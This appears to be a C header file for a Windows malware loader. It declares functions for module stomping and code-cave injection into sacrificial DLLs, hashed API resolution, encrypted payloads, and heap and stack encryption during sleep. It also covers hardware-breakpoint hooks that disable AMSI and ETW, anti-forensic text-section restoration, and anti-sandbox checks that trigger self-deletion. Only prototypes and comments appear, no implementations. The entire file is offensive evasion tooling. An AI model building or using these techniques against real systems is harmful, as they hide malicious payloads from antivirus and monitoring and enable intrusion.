#include "Struct.h"
#include "ApiConstants.h"
#include "Debug.h"
#include "Syscalls.h"

#include <stdio.h>
#include <TlHelp32.h>
#include <intrin.h>

#define CODE_CAVE_PATTERN 0x00 | 0x90
#define          HASH_SEED							5381

#define FILE_ACCESS_MASK FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE

#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_SUCCESS (NTSTATUS)0x00000000L
#define STATUS_UNSUCCESSFUL (NTSTATUS)0xC0000001
#define OKAY(MSG, ...) printf("[+] "		  MSG "\n", ##__VA_ARGS__)
#define INFO(MSG, ...) printf("[*] "          MSG "\n", ##__VA_ARGS__)
#define WARN(MSG, ...) fprintf(stderr, "[-] " MSG "\n", ##__VA_ARGS__)
#define CHAR(MSG, ...) printf("[>] Press <Enter> to "		MSG "\n", ##__VA_ARGS__)

#define U_PTR( x )  (ULONG_PTR)( x )
#define C_PTR( x )  (PVOID)( x )

#ifdef  __x86_64__
#define CurrentPeb __readgsqword( 0x60 )
#else
#define CurrentPeb __readfsdword( 0x30 )
#endif

#define CLOSEHANDLES(Handle) \
if (Handle != NULL && Handle != INVALID_HANDLE_VALUE) \
    CloseHandle(Handle);

// utils.c

/**
* @brief
*   Custom GetModuleHandle Function
* 
* @param ModuleId
*   used to specify which DLL should be returned, based on the cooresponding number
* 
* @return PVOID
*   return a handle to the target dll on success, NULL on failure
*/
PVOID LoadDllModule
(
    _In_ BYTE ModuleId
);

DWORD djb2A(const PWSTR str);

/**
* @brief
*   custom GetProcAddress
* 
* @param ModuleId
*   used to specify which DLL should be returned, based on the cooresponding number
* 
* @param ApiHash
*   function hash of the desired API
* 
* @return PVOID
*   return the address to a specified function on success, NULL on failure
*/
PVOID ResolveHashedFunction
(
    _In_ BYTE ModuleId,
    _In_ DWORD ApiHash
);

PVOID MEMSET
(
    _In_ PVOID	Destination,
    _In_ INT	c,
    _In_ SIZE_T Count
);

VOID MEMCPY
(
    _In_ PVOID	Destination,
    _In_ PVOID	Source,
    _In_ SIZE_T Size
);

SIZE_T STRLEN
(
    _In_ LPCSTR String
);

SIZE_T WCSLEN
(
    _In_ LPCWSTR String
);

// Enum.c

/**
* @brief
*   Go through the .text section of a target dll and find an executable section to store our payload
* 
* @param DllModule
*   Handle to target dll
* 
* @param PayloadSize
*   Size of payload
* 
* @param SectionSize
*   Size of text section
* 
* @return PVOID
*   return Rx Location Address on success, NULL on failure
*/
PVOID FetchRXLocation
(
    _In_    PVOID	DllModule,
    _In_    SIZE_T  PayloadSize,
    _Out_   SIZE_T* SectionSize
);

/**
* @brief
*   Used To Find any Code caves inside the targeted Dll (null or nop insturctions)
* 
* @param DllModule:
*   Target Dll Handle
* 
* @param PayloadSize
*   Size of Payload
* 
* @param CodeCaveAddress
*   Address Of the newly obtained code cave
* 
* @return BOOLEAN
*   TRUE on success, FALSE on failure
*/
BOOLEAN FindCodeCave
(
    _In_	PVOID	DllModule,
    _In_	SIZE_T	PayloadSize,
    _Out_	PBYTE * CodeCaveAddress
);

// crypto.c

VOID RC4
(
    _In_ PVOID	PayloadAddress,
    _In_ SIZE_T PayloadSize
);

/**
* @brief
*   Used to encrypt the process's Heap while threads are suspended
* 
* @return BOOLEAN
*   TRUE on success, FALSE on failure
*/
BOOLEAN HeapCrypt(void);

/**
* @brief
*   Used to Resume any suspended threads
* 
* @return BOOLEAN
*   TRUE on Success, FALSE on Failure
*/
BOOLEAN CryptResumeThreads(void);

/**
* @brief
*   Used to suspend threads on the current process
* 
* @return BOOLEAN
*   TRUE on success, FALSE on failure
*/
BOOLEAN CryptSuspendThreads(void);

BOOLEAN StackCrypt
(
    _In_ HANDLE ThreadHandle
);

BOOLEAN Salsa20Crypt
(
    _In_    const UCHAR * CipherText,
    _In_    SIZE_T CipherTextSize,
    _In_    const UCHAR * Key,
    _In_    const UCHAR * Nonce,
    _Out_   UCHAR * PlainText
);

// HWBP.c

/**
* @brief
*	Using the DR0-3 registers, you can set a hardware breakpoint on a specific function.
*	This combined with the VEH allows us to modify its return value, and make it return early
*	eliminating the API's functionality.
*
* @param FunctionAddress:
*	Address of the specific function
*
* @return BOOLEAN:
*	TRUE on success, FALSE on failure
*/
BOOLEAN SetHardwareBreakpoint(void);

/**
* @brief
*	Remove all hardware breakpoints regardless of how many are places
*
* @return BOOLEAN:
*	TRUE on success, FALSE on failure
*/
BOOLEAN RemoveHardwareBreakpoint(void);

/**
* @brief
*   Vectored Exception Handler for modifying the return status of our target AMSI & ETW Apis
*   This allows us to return these functions early with a SUCCESS/OK message
* 
* @param ExceptionInfo
*   Allows the VEH to utilize x64 bit registers
* 
* @return LONG
*   EXCEPTION_CONTINUE_EXECUTION on success, EXCEPTION_CONTINUE_SEARCH if nothing set
*/
LONG HardwareBreakpointExceptionHandler
(
    _In_ PEXCEPTION_POINTERS ExceptionInfo
);

// stomp.c

/**
* @brief
*   Loading a target dll using LoadLibraryEx, and placing our payload in an executable portions of the
*   dll's .text section
* 
* @param SacrificialDllName
*   Target dll name
* 
* @param Payload
*   User-defined payload
* 
* @param PayloadSize
*   Size of payload
* 
* @return BOOLEAN
*   TRUE on success, FALSE on failure
*/
BOOLEAN LocalModuleStompRxSection
(
    _In_ LPCWSTR	SacrificialDllName,
    _In_ PVOID      Payload,
    _In_ SIZE_T		PayloadSize
);

/**
* @brief
*   Loading a target dll using LoadLibraryEx, and placing our payload in an empty area (NULL/NOP) inside the text section
*
* @param SacrificialDllName
*   Target dll name
*
* @param Payload
*   User-defined payload
*
* @param PayloadSize
*   Size of payload
*
* @return BOOLEAN
*   TRUE on success, FALSE on failure
*/
BOOLEAN LocalModuleStompCodeCave
(
    _In_ LPCWSTR	SacrificialDllName,
    _In_ PVOID      Payload,
    _In_ SIZE_T		PayloadSize
);

/**
* @brief
*	After we stomp the intended DLL, we will replace the .text section, removing any 'artifacts' from our payload
*	very small anti-forensic trick
*
* @param TextSection:
*	Current text section image
*
* @param OriginalTextSection:
*	Image of the .text section before module stomping
*
* @param TextSectionSize:
*	size of text section
*
* @return BOOLEAN:
*	TRUE on Success, FALSE on Failure
*/
BOOLEAN ReplaceTextSection
(
    _In_ PBYTE TextSection,
    _In_ PBYTE OriginalTextSection,
    _In_ SIZE_T TextSectionSize
);

/**
* @brief
*	Custom Sleep Function for Evading Memory Scanners
*
* @param dwMilliseconds:
*	Sleep Time
*
* @return VOID:
*	does not return anything
*/
VOID WINAPI My_Sleep
(
    _In_ DWORD dwMilliseconds
);

// AntiAnalysis.c

/**
* @brief
*   Runs a few Anti-Sandbox & Anti-Analysis checks to ensure the executable is not being debugged
*   nor running in a sandbox environment. If found, it will delete itself
* 
* @return VOID
*   returns nothing
*/
VOID CheckForAnalysis(void);